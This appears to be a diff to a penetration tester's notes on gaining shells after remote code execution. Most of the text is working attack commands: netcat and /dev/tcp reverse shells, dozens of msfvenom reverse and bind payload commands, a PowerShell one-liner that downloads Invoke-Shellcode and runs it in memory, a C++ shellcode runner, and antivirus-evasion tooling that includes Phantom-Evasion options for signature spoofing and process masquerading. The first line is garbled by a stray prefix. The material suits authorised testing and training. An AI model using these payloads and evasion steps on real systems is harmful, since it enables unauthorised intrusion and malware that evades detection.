@@ -1,4 +1,4 @@
-# General - Shells
+LPORT=<LISTENING_PORT># General - Shells
 
 The following note details the procedure and tools that can be used to leverage
 a RCE into a fully TTY shell.  
@@ -232,6 +232,8 @@ exec /bin/sh 0</dev/tcp/<IP>/<PORT> 1>&0 2>&0
 nc -e /bin/sh <IP> <PORT> &
 # The ncat.exe from https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe offers a better compatibility across Windows systems
 nc.exe -e cmd.exe <IP> <PORT>
+nc64.exe -e cmd.exe <IP> <PORT>
+
 
 # Else (Linux):
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f
@@ -378,7 +380,8 @@ engine `mshta.exe`. As the file is not written on disk but directly
 interpreted from the remote URL, this technique can be used to bypass
 some anti-virus solutions.
 
-The following HTA script can be used to load in memory and execute the Nishang PowerShell `Invoke-PowerShellTcp` cmdlet:
+The following HTA script can be used to load in memory and execute the
+`Nishang` `PowerShell`'s `Invoke-PowerShellTcp` cmdlet:
 
 ```
 <script language="VBScript">
@@ -409,6 +412,8 @@ Out-HTA -Payload '<COMMAND>'
 Out-HTA -PayloadURL '<http://<WEBSERVER_IP>:<WEBSERVER_PORT>/<PowerShell.ps1>'
 Out-HTA -PayloadScript '<POWERSHELL_FILEPATH>'
 ```
+
+TODO
 
 #### Binary
 
@@ -446,7 +451,7 @@ int main() {
 The binary must be compiled on the same architecture as the target (advised to
 use the same OS and kernel for Linux targets).
 
-To compile for a Windows target on Linux use the cross-compiler mingw:
+To compile for a Windows target on Linux use the cross-compiler `mingw`:
 
 ```
 # 32 bits
@@ -462,10 +467,10 @@ x86_64-w64-mingw32-gcc -o test.exe test.c
 
 ```
 # 32 bits
-msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o <OUTBIN.exe>
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o <OUTBIN.exe>
 
 # 64 bits
-msfvenom -a x64 --platform windows -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o <OUTBIN.exe>
+msfvenom -a x64 --platform windows -p windows/shell/reverse_tcp LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -b "\x00" -e x86/shikata_ga_nai -f exe -o <OUTBIN.exe>
 ```
 
 For more information on how to generate and use reverse shell binaries using
@@ -642,79 +647,50 @@ MsfVenom cheat sheet:
 # List encoders: msfvenom --list encoders
 # Recommended encoder: -e x86/shikata_ga_nai
 
-msfvenom –p <PAYLOAD> [--platform <PLATEFORM>] [-a <ARCHI>] [-e <ENCODER>] [-b <BADCHAR>] [--smallest] LHOST=<LHOST> LPORT=<LPORT> [–f <FORMAT>] > <FILE>
+msfvenom –p <PAYLOAD> [--platform <PLATEFORM>] [-a <ARCHI>] [-e <ENCODER>] [-b <BADCHAR>] [--smallest] LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> [–f <FORMAT>] > <FILE>
 
 # Windows payloads
-msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > prompt.exe
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > reverse.exe
-msfvenom -p windows/meterpreter/bind_tcp LPORT=<PORT> -f exe > bind.exe
+msfvenom -p windows/shell/reverse_tcp LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f exe > prompt.exe
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f exe > reverse.exe
+msfvenom -p windows/meterpreter/bind_tcp LPORT=<LISTENING_PORT> -f exe > bind.exe
 msfvenom -p windows/adduser USER=<USERNAME> PASS=<PASSWORD> -f exe > adduser.exe
 
 # Linux payloads
 # Bash oneliner
-msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh
+msfvenom -p cmd/unix/reverse_bash LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f raw > shell.sh
 # Basic and stable
-msfvenom -p generic/shell_bind_tcp LHOST=<IP> LPORT=<PORT> -f elf > term.elf
+msfvenom -p generic/shell_bind_tcp LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f elf > term.elf
 # Stageless - CMD shell
 msfvenom -p linux/x86/shell_bind_tcp --platform linux -a x86 PORT=<PORT> -f elf > bind_stageless.elf
-msfvenom -p linux/x86/shell_reverse_tcp --platform linux -a x86 LHOST=<IP> LPORT=<PORT> -f elf > rev_stageless.elf
+msfvenom -p linux/x86/shell_reverse_tcp --platform linux -a x86 LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f elf > rev_stageless.elf
 msfvenom -p linux/x64/shell_bind_tcp --platform linux -a x64 PORT=<PORT> -f elf > bind_x64_stageless.elf
-msfvenom -p linux/x64/shell_reverse_tcp --platform linux -a x64 LHOST=<IP> LPORT=<PORT> -f elf > rev_x64_stageless.elf
+msfvenom -p linux/x64/shell_reverse_tcp --platform linux -a x64 LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f elf > rev_x64_stageless.elf
 # Staged - Meterpreter
 msfvenom -p linux/x86/meterpreter/bind_tcp --platform linux -a x86 PORT=<PORT> -f elf > bind_meterpreter.elf
-msfvenom -p linux/x86/meterpreter/reverse_tcp --platform linux -a x86 LHOST=<IP> LPORT=<PORT> -f elf > reverse_meterpreter.elf
+msfvenom -p linux/x86/meterpreter/reverse_tcp --platform linux -a x86 LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f elf > reverse_meterpreter.elf
 msfvenom -p linux/x64/meterpreter/bind_tcp --platform linux -a x64 PORT=<PORT> -f elf > bind_meterpreter_x64.elf
-msfvenom -p linux/x64/meterpreter/reverse_tcp --platform linux -a x64 LHOST=<IP> LPORT=<PORT> -f elf > reverse_meterpreter_x64.elf
+msfvenom -p linux/x64/meterpreter/reverse_tcp --platform linux -a x64 LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f elf > reverse_meterpreter_x64.elf
 
 # Mac payloads
-msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f macho > reverse.macho
-msfvenom -p osx/x86/shell_bind_tcp LPORT=<PORT> -f macho > bind.macho
+msfvenom -p osx/x86/shell_reverse_tcp LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f macho > reverse.macho
+msfvenom -p osx/x86/shell_bind_tcp LPORT=<LISTENING_PORT> -f macho > bind.macho
 
 # Web based payloads
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > reverse.asp
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > reverse.jsp
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > reverse.war
-msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f asp > reverse.asp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f raw > reverse.jsp
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f war > reverse.war
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f raw > shell.php
 
 # Script payloads
-msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > reverse.py
-msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > reverse.pl
+msfvenom -p cmd/unix/reverse_python LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f raw > reverse.py
+msfvenom -p cmd/unix/reverse_perl LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f raw > reverse.pl
 
 # Shellcodes
-msfvenom –p <PAYLOAD> –f <FORMAT> -e <ENCODER> -b <BADCHAR> --smallest LHOST=<LHOST> LPORT=<LPORT> -f bash > <FILE>
-msfvenom –p <PAYLOAD> –f <FORMAT> -e <ENCODER> -b <BADCHAR> --smallest LHOST=<LHOST> LPORT=<LPORT> -f powershell > <FILE>
+msfvenom –p <PAYLOAD> –f <FORMAT> -e <ENCODER> -b <BADCHAR> --smallest LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f bash > <FILE>
+msfvenom –p <PAYLOAD> –f <FORMAT> -e <ENCODER> -b <BADCHAR> --smallest LHOST=<LISTENING_IP> LPORT=<LISTENING_PORT> -f powershell > <FILE>
 ```
 
-###### PowerShell
-
-*Invoke-Shellcode*
-
-The msfvenom and Invoke-Shellcode tools can be used to leverage a meterpreter
-on the target through PowerShell and in memory execution. This can be used to
-bypass AV detection.
-
-The commands to generate a payload, download and execute it on the target are
-as follows:
-
-```bash
-# x86 target
-msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<HOST_IP> LPORT=<HOST_PORT> -f powershell -o meterpreter.ps1
-
-# x64 target
-msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=<HOST_IP> LPORT=<HOST_PORT> -f powershell -o meterpreter.ps1
-
-# Then replace the payload in the Invoke-Shellcode script with the generated payload
-# Copy everything from 0xfc to 0xd5 into the $Shellcode32 or $Shellcode64 variables
-
-# Setup a web server hosting the modified Invoke-Shellcode script and a metasploit handler with the according payload
-# python -m SimpleHTTPServer <HOST_PORT>
-# msf > use multi/handler ...
-
-# Then download in memory and execute the reverse meterpreter
-powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-Shellcode.ps1'); Invoke-Shellcode -Force;
-```
-
-###### HTML Application
+###### Meterpreter through HTML Application
 
 Windows HTML Application script can contain JavaScript or VBScript that will be
 interpreted by the operating system.
@@ -735,11 +711,88 @@ msf> use exploit/windows/misc/hta_server
 mshta.exe http://<HOSTNAME | IP>:<PORT>/<FILENAME>.hta
 ```
 
+### Anti-Virus bypass tools
 
-###### Binary
+###### Shellcodes in custom binary / PowerShell Invoke-Shellcode
 
-The following C code can be used to compile a binary that will escape some
-anti-virus:
+*Generate shellcode*
+
+`msfvenom` can be used to generate a `meterpreter` shellcode, which can later
+be integrated and run from a compiled binary or a `PowerShell` script.  
+
+The encoder `shikata_ga_nai` with some iterations yields the best results.
+
+The commands to generate a shellcode are as follows:
+
+```
+-- C output format
+# x86 target
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST="<LISTENING_IP>" LPORT="<HOST_PORT>" -b \x00\x0a\x0d -e x86/shikata_ga_nai -i 20 -f c
+
+# x64 target
+msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST="<LISTENING_IP>" LPORT="<HOST_PORT>" -b \x00\x0a\x0d -f c
+
+-- PowerShell output format
+# x86 target
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST="<LISTENING_IP>" LPORT="<HOST_PORT>" -b \x00\x0a\x0d -f powershell
+
+# x64 target
+msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST="<LISTENING_IP>" LPORT="<HOST_PORT>" -b \x00\x0a\x0d -f powershell
+```
+
+*Invoke-Shellcode*
+
+The `PowerShell` `PowerSploit`'s `Invoke-Shellcode` cmdlet can be leveraged to
+execute directly in memory the shellcode through `IEX` `DownloadString`.
+
+Depending on the system architecture, `Invoke-Shellcode` will either inject and
+run the shellcode specified in the `$Shellcode32` or `$Shellcode64` variables.
+
+```bash
+# A web server hosting the modified Invoke-Shellcode script and a metasploit handler with the according payload type must be up and running
+
+powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Invoke-Shellcode.ps1'); Invoke-Shellcode -Force;
+```
+
+*Custom binaries*
+
+The following C / C++ programs can be compiled on Linux using the
+cross-compiler `mingw` or on Windows (recommended) using
+`Developer Command Prompt` from `Visual Studio`:
+
+```
+# 32 bits
+i686-w64-mingw32-gcc -lws2_32 -o <BINARY_NAME> <C_PROGRAM>
+i686-w64-mingw32-g++ -lws2_32 -o <BINARY_NAME> <C_PROGRAM>
+# 64 bits
+x86_64-w64-mingw32-gcc -lws2_32 -o <BINARY_NAME> <C_PROGRAM>
+x86_64-w64-mingw32-g++ -lws2_32 -o <BINARY_NAME> <C_PROGRAM>
+
+cl <C_PROGRAM | CPP_PROGRAM>
+```
+
+The C++ code below, from `ired.team`, may be used as a template for running the
+shellcode in a compiled binary:
+
+```c++
+#include <stdio.h>
+#include "Windows.h"
+
+int main()
+{
+	unsigned char b[] =
+	"";
+
+	void *exec = VirtualAlloc(0, sizeof b, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	memcpy(exec, b, sizeof b);
+	((void(*)())exec)();
+
+    return 0;
+}
+```
+
+The following C code can be used to compile a binary that will execute the
+`PowerShell`'s `Invoke-Shellcode` cmdlet:
 
 ```c
 #include <stdio.h>
@@ -751,9 +804,7 @@ int main() {
 }
 ```
 
-### Anti-Virus bypass tools
-
-###### (Windows / PowerShell) Unicorn
+###### (Windows / PowerShell) Unicorn (outdated)
 
 Magic Unicorn is a tool for using a PowerShell downgrade attack and inject
 shellcode (custom, cobalt or meterpreter) straight into memory.
@@ -836,7 +887,7 @@ Select payload by index: 1
 ***************************
 * meterpreter_reverse_tcp *
 ***************************
-SET LHOST: <HOSTIP>
+SET LHOST: <HOSTNAME | IP>
 SET LPORT: <HOSTPORT>
 Payload: meterpreter_reverse_tcp
 
@@ -846,6 +897,40 @@ Injection: Verified!
 Press [Enter] to continue...
 ```
 
-###### Ebowla
+###### Phantom-Evasion
 
-### WinRM
+`Phantom-Evasion 3.0` is a framework written in `Python` that can generate
+both x86 or x64 executables and DLL / ReflectiveDLL.
+
+`Phantom-Evasion 3.0` supports a number of Anti-virus evasion techniques,
+execution and injection methods (thread, asynchronous procedure call, thread
+execution hijack, etc.) with various memory allocation techniques (Virtual_RWX,
+Virtual_RW/RX, etc.), and shellcode encryption.
+
+Additionally, out of scope of the present note, `Phantom-Evasion 3.0` can be
+used to generate Linux shellcode, backdoored Android APK, and offers various
+Windows privileges escalation and persistence modules.
+
+```bash
+# With out any arguments, Phantom-Evasion is started in interactive mode
+python3 phantom-evasion.py
+
+-- General options
+# -S, --strip / Strip executable
+# -c <CERTSIGN>, --certsign <CERTSIGN> / Certificate spoofer and exe signer
+# -cd <CERTDESCR>, --certdescr <CERTDESCR> /  Certificate description
+# -E <EVASIONFREQUENCY>, --evasionfrequency EVASIONFREQUENCY /  Windows evasion code frequency (default:10)
+# -J <JUNKFREQUENCY>, --junkfrequency <JUNKFREQUENCY> / Junkcode frequency (default:10)
+# -j <JUNKINTENSITY>, --junkintensity <JUNKINTENSITY> / Junkcode intensity (default:10)
+# -jr <JUNKREINJECT>, --junkreinject <JUNKREINJECT> / Junkcode reinjection intensity (default:10)
+# -un, --unhook / Add Ntdll unhook routine
+# -msq <MASQPATH>, --masqpath <MASQPATH> / Fake Process path for masquerading (default: C:\windows\system32\notepad.exe)
+# -msqc <MASQCMD>, --masqcmd <MASQCMD> / Fake Fullcmdline for masquerading (default: empty)
+
+-- Windows meterpreter stager
+# MODULES:  
+#   windows/meterpreter/reverse_TCP = WRT
+#   windows/meterpreter/reverse_http = WRH
+#   windows/meterpreter/reverse_https = WRS
+python3 phantom-evasion.py -a <x86 | x64> -m <WRT | WRH | WRS> -H <LISTENING_IP> -P <LISTENING_PORT> -f <exe | dll> -o <OUTPUT_FILENAME>
+```
